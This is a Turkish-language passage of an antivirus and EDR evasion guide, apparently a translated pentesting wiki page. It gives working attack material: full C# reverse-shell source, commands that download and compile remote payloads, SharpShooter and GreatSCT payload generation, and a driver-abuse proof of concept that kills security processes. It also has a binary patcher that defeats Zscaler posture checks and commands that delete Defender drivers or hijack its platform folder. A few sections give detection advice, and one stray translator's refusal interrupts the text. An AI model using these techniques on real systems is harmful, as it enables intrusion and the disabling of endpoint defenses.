- Yardım için `winvnc -h` komutunu çalıştırmayın; aksi hâlde bir [popup](https://i.imgur.com/oc18wcu.png) tetiklenir

### GreatSCT

Buradan indirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT içinde:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Şimdi `msfconsole -r file.rc` ile **lister'ı başlatın** ve **xml payload**'ı **şu komutla çalıştırın**:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Mevcut defender işlemi çok hızlı sonlandıracaktır.**

### Kendi reverse shell'imizi derleme

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Şununla derleyin:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Şununla kullanın:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# derleyicisini kullanma

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve çalıştırma:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscator listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Injector oluşturmak için Python kullanımı örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Daha Fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Alanından AV/EDR’yi Sonlandırma

Storm-2603, fidye yazılımını bırakmadan önce uç nokta korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir konsol yardımcı programından yararlandı. Araç, **kendi savunmasız ama *imzalı* sürücüsünü** beraberinde getiriyor ve bu sürücüyü, Protected-Process-Light (PPL) AV hizmetlerinin bile engelleyemediği ayrıcalıklı kernel işlemlerini gerçekleştirmek için kötüye kullanıyor.<sup>[[12]](#references)</sup>

Önemli noktalar
1. **İmzalı sürücü**: Diske bırakılan dosya `ServiceMouse.sys` olsa da, ikili dosya Antiy Labs’ın “System In-Depth Analysis Toolkit” paketindeki yasal olarak imzalanmış `AToolsKrnl64.sys` sürücüsüdür. Sürücü geçerli bir Microsoft imzası taşıdığından, Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Hizmet kurulumu**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   İlk satır sürücüyü bir **kernel service** olarak kaydeder, ikinci satır ise sürücüyü başlatarak `\\.\ServiceMouse` öğesinin kullanıcı alanından erişilebilir olmasını sağlar.
3. **Sürücünün sunduğu IOCTL'ler**
   | IOCTL code | Capability                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PID ile rastgele bir süreci sonlandırma (Defender/EDR servislerini durdurmak için kullanılır) |
   | `0x990000D0` | Diskteki rastgele bir dosyayı silme |
   | `0x990001D0` | Sürücüyü kaldırma ve servisi silme |

   Minimal C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Neden işe yarıyor**: BYOVD, user-mode korumalarını tamamen atlar; kernel'de çalışan kod, PPL/PP, ELAM veya diğer güçlendirme özelliklerinden bağımsız olarak *korumalı* süreçleri açabilir, sonlandırabilir ya da kernel nesnelerini kurcalayabilir.

Tespit / Azaltma
•  Windows'ın `AToolsKrnl64.sys` dosyasını yüklemeyi reddetmesi için Microsoft'un güvenlik açığı bulunan sürücüler engelleme listesini (`HVCI`, `Smart App Control`) etkinleştirin.
•  Yeni *kernel* hizmetlerinin oluşturulmasını izleyin ve bir sürücü world-writable bir dizinden yüklendiğinde veya allow-list'te bulunmadığında uyarı verin.
•  Özel cihaz nesnelerine yönelik user-mode tanıtıcılarını ve ardından gelen şüpheli `DeviceIoControl` çağrılarını izleyin.

### Diskteki Binary'leri Yamayarak Zscaler Client Connector Posture Kontrollerini Atlatma

Zscaler’ın **Client Connector** uygulaması, cihaz posture kurallarını yerel olarak uygular ve sonuçları diğer bileşenlere iletmek için Windows RPC'ye güvenir. İki zayıf tasarım tercihi, tam bir bypass'ı mümkün kılar:

1. Posture değerlendirmesi **tamamen istemci tarafında** gerçekleşir (sunucuya bir boolean gönderilir).
2. Dahili RPC uç noktaları, bağlanan executable'ın **Zscaler tarafından imzalandığını** (`WinVerifyTrust` aracılığıyla) doğrular.<sup>[[11]](#references)</sup>

**Diskteki dört imzalı binary yamalanarak** her iki mekanizma da etkisiz hale getirilebilir:

| Binary | Yamalanan orijinal mantık | Sonuç |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döndürür; böylece her kontrol uyumlu olur |
| `ZSAService.exe` | `WinVerifyTrust` için dolaylı çağrı | NOP-ed ⇒ herhangi bir süreç (imzasız olanlar bile) RPC pipe'larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirilir |
| `ZSATunnel.exe` | Tüneldeki bütünlük kontrolleri | Kısa devre edilir |

Minimal patcher alıntısı:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Orijinal dosyaları değiştirdikten ve servis yığınını yeniden başlattıktan sonra:

* **Tüm** duruş kontrolleri yeşil/uyumlu görünür.
* İmzasız veya değiştirilmiş ikili dosyalar, adlandırılmış pipe RPC uç noktalarını açabilir (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ele geçirilmiş ana makine, Zscaler politikalarında tanımlanan iç ağa sınırsız erişim kazanır.

Bu vaka çalışması, tamamen istemci tarafındaki güven kararlarının ve basit imza kontrollerinin birkaç baytlık yamayla nasıl aşılabileceğini gösterir.

## Microsoft Defender `BTR.sys` güvenilir işlevsellik istismarı

Defender'ın **Boot-Time Removal** sürücüsü, klasik BYOVD'ye yararlı bir karşı örnektir. `BTR.sys`, bellek bozulması hatası ve IOCTL arayüzü olmayan, Microsoft tarafından imzalanmış meşru bir iyileştirme bileşenidir; yönetici erişimi ve `SeLoadDriverPrivilege` elde edildikten sonra bir operatör, bunun yerine sürücünün özel iyileştirme işlemini taklit ederek amaçlanan Ring-0 dosya/kayıt defteri işlemlerini gerçekleştirebilir. Bu, **ilk erişim veya ayrıcalık yükseltme değil, sistem ele geçirildikten sonra AV/EDR etkisizleştirme yöntemidir** ve sürücü, dikkat çeken üçüncü taraf bir sürücü içe aktarmak yerine hedefin kendi `MpEngine.dll` dosyasındaki `BOOTTIMETOOL` kaynağından çıkarılabilir.<sup>[[36]](#references)</sup>

### Tek kullanımlık sürücüyü hazırlama

Defender normalde kaynağı rastgele bir `[a-z]{8}.sys` dosyası olarak bırakır ve benzer biçimde adlandırılmış bir kernel servisi kaydeder. `DriverEntry`, servisin `Args` değerini okur, başvurulan NTFS ADS'yi açar, işlem listesinin şifresini çözer ve doğrular, geri bildirim yazar; başarılı yürütmenin ardından `0xC0000056` (`STATUS_DELETE_PENDING`) döndürerek sürücünün bellekte kalmak yerine yüklemesinin kaldırılmasını sağlar. Taklit edilen bir servis şu karakteristik değerlere sahiptir.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` akışı, RC4 ile şifrelenmiş tek bir blob içerir. Analiz edilen derlemelerde sabit 256 baytlık bir anahtar yeniden kullanıldığından, şifreleme bir yetkilendirme sınırı değildir. Geçerli bir düz metin; 24 baytlık global bir başlık (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, başlık CRC'si ve payload'dan türetilmiş bir işlem kimliği), ardından null ile sonlandırılmış bir UTF-16 geri bildirim yolu ve istenen sayıda öğe içerir. Her öğe, 16 baytlık bir başlığa (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) ve **tam olarak dört NUL baytıyla** biten eyleme özgü verilere sahiptir. Her başlık/veri bölgesi, CRC-32 polinomu `0xEDB88320`, başlangıç durumu `0xFFFFFFFF` ve **son XOR olmadan** (`~CRC32`) bağımsız olarak kontrol edilir; her bölge için CRC durumu sıfırlanır.<sup>[[36]](#references)[[37]](#references)</sup>

Kabul edilen eylem kimlikleri, bu kernel primitive'lerini açığa çıkarır.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Öğe verisi | Sonuç |
| --- | --- | --- |
| 1 | `[UTF-16 yolu]` | Kilitli dosyalar da dahil olmak üzere bir dosyayı siler |
| 2 | `[UTF-16 yolu]` | Boş bir dizini kaldırır |
| 3 | `[Flags][kaynak][hedef]` | Bir dosyayı saldırganın seçtiği korumalı bir yola taşır; boş hedef silme anlamına gelir |
| 4 | `[Flags][anahtar yolu]` | Bir kayıt defteri anahtarını özyinelemeli olarak siler |
| 5 | `[Flags][anahtar yolu + "\\" + değer]` | Bir kayıt defteri değerini siler |
| 6 | `[Flags][tür][boyut][anahtar yolu + "\\" + değer][veri]` | Bir kayıt defteri değeri oluşturur/günceller ve eksik anahtar yollarını oluşturur |

5 ve 6 numaralı eylemlerde, kablodaki anahtar/değer ayıracı **art arda gelen iki ters eğik çizgidir**; geleneksel biçimde yazılmış bir yol doğru şekilde bölünmez. Geri bildirim dosyası çoğunlukla isteği yansıtır; ancak her öğenin ilk dört veri baytı, sonuçta oluşan `NTSTATUS` değerine dönüşür. Başında flags alanı bulunmayan 1 ve 2 numaralı eylemlerde BTR, bu duruma yer açmak için yolu ayrılmış son dört bayta kaydırır.<sup>[[36]](#references)</sup>

### `BTR_CLI` iş akışı ve erken önyükleme aralığı

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) tüm zinciri uygular: yerel Defender'dan `BTR.sys` dosyasını çıkarır, `<random>.sys:changelist` ve bir geri bildirim akışı oluşturur, zincirlenmiş eylemleri serileştirir, checksum hesaplayıp şifreler, hizmet kayıt defteri anahtarını doğrudan oluşturur ve ardından `-trigger now` için `NtLoadDriver` çağrısı yapar veya `-trigger boot` için sürücüyü sistem başlangıcında çalışacak şekilde bırakır. Kayıt defterinin doğrudan hazırlanması, normal SCM `CreateServiceW` yolunu atlar ve bu nedenle Hizmet Yükleme Olay Kimliği 7045'i oluşturmaz. Önyükleme tetiklemeli kalıntılar daha sonra `BTR_CLI.exe -cleanup <service_name>` ile kaldırılabilir.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` kullanılamaz; çünkü BTR, depolama yığını ve `SystemRoot` bağlantısı hazır olmadan `DriverEntry` üzerinden dosya I/O işlemleri gerçekleştirir. Yüksek öncelikli `Boot Bus Extender` grubuyla birlikte `Start=1` kullanıldığında işlem Phase 1'de gerçekleşir: NTFS kullanılabilir durumdadır, ancak birçok sistem başlangıç güvenlik sürücüsü ve kullanıcı modu EDR hizmeti henüz başlatılmamıştır. `WdFilter` gibi önyükleme başlangıç filtreleri zaten yüklenmiş olabilir; ancak BTR, bir sonraki başlatmadan önce bunların ikili dosyalarını veya hizmet yapılandırmalarını kaldırabilir ve SCM bunları başlatmadan önce hizmet yürütülebilir dosyalarını silebilir. BTR, önyükleme başlangıç değerlendirmesinden sonra çalıştığı ve geçerli bir Microsoft imzası taşıdığı için ELAM bu açığı kapatmaz.<sup>[[36]](#references)</sup>

Birden fazla eylem tek bir işlemde yürütülür. PoC, sabit kodlanmış `\SystemRoot\Temp\BootClean.log` için Action 1'i başa ekler: BTR bu günlüğü oluşturur, ardından kendi silme isteğini işler ve boşaltılmadan önce günlüğü kaldırır. Bu, geride kalan kanıtı azaltırken geri bildirimin `<random>.sys:<random>.dat` konumuna yazılması sürücünün ve her iki akışın birlikte kaldırılmasını sağlar.<sup>[[36]](#references)[[37]](#references)</sup>

### Yüksek sinyalli tespit korelasyonları

Yalnızca imzaya dayalı kurallar ve Microsoft'un güvenlik açığı bulunan sürücü engelleme listesi, BTR'nin amaçlanan işlevlerinin kötüye kullanılmasını ele almaz. Meşru Defender kökenini rastgele bir başlatıcıdan ayırt ederken şu davranışsal korelasyonları tercih edin.<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` oluşturulması, BTR hazırlığı için evrensel bir göstergedir. Aynı `.sys` dosyasına eklenen bir `.dat` ADS özellikle şüphelidir; çünkü meşru Defender genellikle geri bildirimi `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` altında tutar.
- **System 7045 olmadan Sysmon 12/13:** `Args=...:changelist` ve `Group=Boot Bus Extender` içeren `HKLM\SYSTEM\CurrentControlSet\Services\<random>` konumunun doğrudan oluşturulmasını, eşleşen bir SCM yükleme olayı yoksa korelasyonlayın.
- **Sysmon 6 -> 23:** Defender dışı kökenli bilinen bir BTR sürücüsünün yüklenmesini, özellikle güvenlik ikili dosyaları için `System`/PID 4'e atfedilen sonraki dosya silme işlemiyle korelasyonlayın.
- **Sysmon 11 -> 23:** `System`/PID 4 tarafından `\SystemRoot\Temp\BootClean.log` dosyasının kısa aralıklarla oluşturulup silinmesi için uyarı verin.
- `SeLoadDriverPrivilege` atamasını/etkinleştirilmesini kısıtlayın ve denetleyin; bir güvenlik aracı sürücüsü `cmd.exe`, PowerShell veya bilinmeyen bir işlem tarafından hazırlandığında yalnızca Microsoft imzası yeterli bir güvence değildir.

## LOLBIN'lerle AV/EDR'ye Müdahale Etmek İçin Protected Process Light (PPL) Kötüye Kullanımı

Protected Process Light (PPL), yalnızca eşit veya daha yüksek koruma düzeyindeki işlemlerin birbirine müdahale edebilmesini sağlayan bir imzalayan/düzey hiyerarşisi uygular. Saldırganlar açısından, PPL etkin bir ikili dosyayı meşru biçimde başlatabiliyor ve bağımsız değişkenlerini kontrol edebiliyorsanız, günlük kaydı gibi zararsız işlevleri AV/EDR tarafından kullanılan korumalı dizinlere yazma olanağı sağlayan, kısıtlı ve PPL destekli bir ilkel hâline getirebilirsiniz.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Bir işlemin PPL olarak çalışmasını sağlayanlar
- Hedef EXE (ve yüklenen tüm DLL'ler) PPL destekli bir EKU ile imzalanmış olmalıdır.
- İşlem, şu bayraklarla CreateProcess kullanılarak oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- İkili dosyanın imzalayanıyla eşleşen uyumlu bir koruma düzeyi istenmelidir (ör. kötü amaçlı yazılımdan koruma imzalayanları için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows imzalayanları için `PROTECTION_LEVEL_WINDOWS`). Yanlış düzeyler, oluşturma işleminin başarısız olmasına neden olur.

PP/PPL ve LSASS korumasına daha geniş kapsamlı bir giriş için şuraya da bakın:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Başlatıcı araçları
- Açık kaynaklı yardımcı araç: CreateProcessAsPPL (koruma düzeyini seçer ve bağımsız değişkenleri hedef EXE'ye iletir):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Kullanım örüntüsü:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Bu içerik, PPL kullanarak antivirüs korumalı dosyaları bozma ve antivirüsün başlamasını engelleme adımlarını açıklıyor. Bu operasyonel talimatları çeviremiyorum. İsterseniz savunma odaklı bir özetini Türkçeye çevirebilirim.

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notlar ve kısıtlamalar
- ClipUp'ın yazdığı içeriği, yalnızca nereye yazılacağını belirleyerek kontrol edemezsiniz; bu primitive, hassas içerik enjeksiyonundan ziyade bozulma için uygundur.
- Bir hizmeti yüklemek/başlatmak ve yeniden başlatma aralığından yararlanmak için yerel admin/SYSTEM gerekir.
- Zamanlama kritiktir: hedef açık olmamalıdır; önyükleme sırasında çalıştırma, dosya kilitlerini önler.

Tespit
- Özellikle standart olmayan başlatıcılar tarafından başlatılan `ClipUp.exe` süreçlerinin, önyükleme civarında alışılmadık argümanlarla oluşturulması.
- Şüpheli ikili dosyaları otomatik başlatacak şekilde yapılandırılmış yeni hizmetler ve bu hizmetlerin Defender/AV'den önce düzenli olarak başlaması. Defender başlangıç hatalarından önceki hizmet oluşturma/değiştirme işlemlerini inceleyin.
- Defender ikili dosyaları/Platform dizinleri için dosya bütünlüğü izleme; korumalı süreç bayraklarına sahip süreçlerin beklenmedik dosya oluşturma/değiştirme işlemleri.
- ETW/EDR telemetrisi: `CREATE_PROTECTED_PROCESS` ile oluşturulan süreçleri ve AV dışı ikili dosyaların anormal PPL seviyesi kullanımını araştırın.

Azaltma
- WDAC/Code Integrity: PPL olarak hangi imzalı ikili dosyaların, hangi üst süreçler altında çalışabileceğini kısıtlayın; ClipUp'ın meşru bağlamlar dışındaki çağrılarını engelleyin.
- Hizmet hijyeni: otomatik başlatılan hizmetlerin oluşturulmasını/değiştirilmesini kısıtlayın ve başlangıç sırası manipülasyonunu izleyin.
- Defender tamper protection ve erken başlatma korumalarının etkin olduğundan emin olun; ikili dosya bozulmasına işaret eden başlangıç hatalarını inceleyin.
- Ortamınızla uyumluysa güvenlik araçlarını barındıran birimlerde 8.3 kısa ad oluşturmayı devre dışı bırakmayı değerlendirin (iyice test edin).

## Platform Sürüm Klasöründeki Symlink Hijack ile Microsoft Defender'ı Kurcalama

Windows Defender, çalışacağı platformu şu dizinin alt klasörlerini numaralandırarak seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Sözlüksel olarak en yüksek sürüm dizgesine sahip alt klasörü seçer (ör. `4.18.25070.5-0`), ardından Defender hizmet süreçlerini bu klasörden başlatır (hizmet/kayıt defteri yollarını buna göre günceller). Bu seçim, dizin symlink'leri dâhil olmak üzere dizin girdilerine güvenir. Bir yönetici, Defender'ı saldırganın yazabildiği bir yola yönlendirmek ve DLL sideloading veya hizmet kesintisi gerçekleştirmek için bundan yararlanabilir.<sup>[[21]](#references)[[22]](#references)</sup>

Ön koşullar
- Yerel Administrator (Platform klasöründe dizin/symlink oluşturmak için gerekir)
- Yeniden başlatma veya Defender platformunun yeniden seçilmesini tetikleme olanağı (önyüklemede hizmetin yeniden başlatılması)
- Yalnızca yerleşik araçlar gerekir (`mklink`)

Neden işe yarar
- Defender kendi klasörlerine yazmayı engeller, ancak platform seçimi dizin girdilerine güvenir ve hedefin korumalı/güvenilir bir yola çözümlendiğini doğrulamadan sözlüksel olarak en yüksek sürümü seçer.

Adım adım (örnek)
1) Mevcut platform klasörünün yazılabilir bir kopyasını hazırlayın; ör. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde klasörünüze işaret eden daha yüksek sürümlü bir dizin symlink'i oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Tetikleyici seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) işleminin yönlendirilmiş yoldan çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Yeni işlem yolunu `C:\TMP\AV\` altında ve hizmet yapılandırması/kayıt defterinde bu konumu gösterecek şekilde gözlemlemelisiniz.

Post-exploitation seçenekleri
- DLL sideloading/code execution: Defender’ın uygulama dizininden yüklediği DLL’leri bırakın/değiştirin; böylece Defender’ın işlemlerinde kod çalıştırabilirsiniz. Yukarıdaki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Sürüm symlink’ini kaldırın; böylece bir sonraki başlatmada yapılandırılmış yol çözümlenemez ve Defender başlatılamaz:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Bu tekniğin tek başına yetki yükseltme sağlamadığını; yönetici hakları gerektirdiğini unutmayın.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red team'ler, runtime evasion işlemlerini C2 implantından çıkarıp hedef modülün içine taşıyabilir; bunun için modülün Import Address Table'ını (IAT) hook'layıp seçili API'leri saldırganın denetimindeki position-independent code (PIC) üzerinden yönlendirir. Bu yaklaşım, evasion kapsamını birçok kitin sunduğu sınırlı API yüzeyinin (ör. CreateProcessA) ötesine taşır ve aynı korumaları BOF'lara ve post-exploitation DLL'lerine de uygular.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Üst düzey yaklaşım
- Reflective loader kullanarak hedef modülün yanına bir PIC blob yerleştirin (modülün başına eklenmiş veya companion olarak). PIC kendi içinde yeterli olmalı ve position-independent olmalıdır.
- Host DLL yüklenirken IMAGE_IMPORT_DESCRIPTOR içinde ilerleyip hedeflenen import'ların (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) IAT girdilerini ince PIC wrapper'larına yönlendirin.
- Her PIC wrapper, gerçek API adresine tail-call yapmadan önce evasion işlemlerini yürütür. Yaygın evasion işlemleri şunlardır:
  - Çağrıdan önce ve sonra bellek maskeleme/maske kaldırma (ör. beacon bölgelerini şifreleme, RWX→RX, sayfa adlarını/izinlerini değiştirme).
  - Call-stack spoofing: zararsız görünen bir stack oluşturup hedef API'ye geçiş yaparak call-stack analizinin beklenen frame'leri çözümlemesini sağlama.<sup>[[9]](#references)</sup>
- Uyumluluk için, bir Aggressor script'inin (veya eşdeğerinin) Beacon, BOF'lar ve post-ex DLL'ler için hangi API'lerin hook'lanacağını kaydedebileceği bir arayüz dışa aktarın.

Burada neden IAT hooking?
- Hook'lanan import'u kullanan her türlü kodda çalışır; araç kodunu değiştirmeyi veya belirli API'leri proxy'lemek için Beacon'a güvenmeyi gerektirmez.
- Post-ex DLL'lerini kapsar: LoadLibrary*'ı hook'lamak, modül yüklemelerini (ör. System.Management.Automation.dll, clr.dll) yakalamanıza ve bu modüllerin API çağrılarına aynı maskeleme/stack evasion işlemlerini uygulamanıza olanak tanır.
- CreateProcessA/W'yi wrapper'layarak call-stack tabanlı tespitlere karşı process-spawning post-ex komutlarının güvenilir biçimde kullanılmasını sağlar.

Minimal IAT hook taslağı (x64 C/C++ sözde kodu)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
